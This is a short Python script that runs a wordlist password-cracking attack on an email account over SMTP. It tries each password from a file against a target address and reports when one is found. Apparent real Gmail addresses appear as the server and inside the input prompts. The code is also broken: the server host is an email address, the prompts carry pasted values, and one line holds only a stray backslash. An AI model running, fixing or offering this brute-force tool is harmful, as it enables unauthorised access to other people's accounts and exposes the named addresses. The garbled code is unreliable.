import smtplib


def main():
    smtpserver = smtplib.SMTP("jubayershoron@gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
\
    user = raw_input("Alpha : Enter the target's email address: miashapon590@gmail.com")
    passwfile = raw_input("Alpha : Enter the password file name:crack.py ")
    passwfile = open(passwfile, "r")

    for password in passwfile:
        try:
            smtpserver.login(user, password)
            print("Alpha : [+] Password Found: %s" % password)
            break
        except smtplib.SMTPAuthenticationError:
            print("Alpha : [!] Password Incorrect: %s" % password)

if __name__ == "__main__":
    main()
